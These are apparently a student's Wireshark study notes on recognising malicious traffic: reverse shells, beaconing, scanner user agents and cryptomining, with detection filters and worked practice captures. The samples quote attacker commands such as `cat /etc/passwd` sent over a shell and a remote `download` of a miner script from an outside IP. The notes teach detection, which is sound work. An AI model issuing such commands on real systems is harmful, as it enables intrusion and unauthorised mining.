# Section 10 - Malicious Traffic Analysis

## Goal

Recognise what post-exploitation traffic looks like: reverse shells, C2 beaconing, scanner user agents, cryptomining and large uploads.

## Why it matters

Once malware is inside, it has to talk to someone. That communication is what I can see in a capture, even when the malware itself is hidden on the host.

## Five patterns to know

1. Reverse shell: the victim connects out to the attacker (often port 4444, 5555 or 1337) and the attacker gets a command prompt.
2. C2 beaconing: the malware checks in at a fixed interval (for example every 60 seconds) with small, same-size packets.
3. Tool user agents: `sqlmap`, `Nikto`, `Python-urllib`, `Go-http-client`, old `curl` versions.
4. Cryptomining: Stratum JSON-RPC over TCP (`mining.subscribe`, `mining.authorize`, `mining.submit`), often on ports 3333, 4444 or 8080.
5. Exfiltration spike: a sudden large upload to an unknown external IP.

## Indicators

| Indicator | What it looks like in Wireshark |
|-----------|---------------------------------|
| Reverse shell | Raw TCP stream on 4444 / 5555 / 1337 with readable commands such as `whoami` |
| Beaconing | Same packet size at the same interval, sent out from one host |
| Scanner or bot | Tool name in the User-Agent header |
| Cryptominer | `mining.submit` and `xmrig` in the TCP payload |

## Filters

```
tcp.port == 4444 || tcp.port == 1337
http.user_agent contains "sqlmap"
http.user_agent contains "Python"
http.user_agent contains "Go-http"
tcp.payload contains "mining.submit"
```

A note on beaconing: a filter such as `frame.time_delta > 59 && frame.time_delta < 61` only compares each packet with the one before it in the whole capture, so other traffic breaks it. A better way is to filter the conversation first (one IP pair) and then look at the time column, or use Statistics, I/O Graphs to see regular peaks.

## Sample: reverse shell on port 4444

Victim 192.168.1.75 connects out to 45.33.22.11:4444. After the handshake the attacker sends `whoami`, the victim replies `www-data`, then the attacker runs `cat /etc/passwd`. Right click a packet, Follow, TCP Stream shows the whole session as plain text.

## Practice 1 (medium): workstation 10.0.0.110

The host connects to 198.51.100.5 on port 4444. The remote side sends `uname -a`, then `download http://198.51.100.5/miner.sh`.

1. Session type. My answer: "malware and data exfiltration". The precise answer is an interactive reverse shell (Netcat or Metasploit style) on port 4444. Part of my answer was right (malware), but nothing in this capture is exfiltration yet.
2. Commands. My answer: the attacker ran remote commands (RCE). Correct. Packet 4 (`uname -a`) checks the operating system. Packet 6 downloads a second stage cryptomining script.
3. Filter: `tcp.port==4444`. Correct.

## Practice 2 (hard): server 172.16.50.5 at 100 percent CPU

TCP traffic to 192.0.2.200 on port 3333 with JSON messages: `mining.subscribe` with `xmrig/6.18.0`, then `mining.authorize` with a wallet, then `mining.submit`.

I did not know this one. The answers:

1. Activity: cryptojacking, meaning unauthorised cryptocurrency mining on the server.
2. Tool: XMRig version 6.18.0, an open source Monero miner often abused by attackers.
3. Protocol: the Stratum mining protocol, which is JSON-RPC over TCP.
4. Response: isolate the server, kill the miner process, block the mining pool IP, then remove persistence (cron jobs, systemd services) and find how the attacker got in.

## What I learned

- A readable interactive stream on an odd port is almost always a shell.
- 100 percent CPU plus steady outbound traffic to one host on port 3333 is a strong cryptomining sign.
- Do not call something exfiltration until I can see data leaving.

## Still to practise

- Cryptomining and the Stratum protocol
- Finding beaconing with I/O Graphs instead of a time filter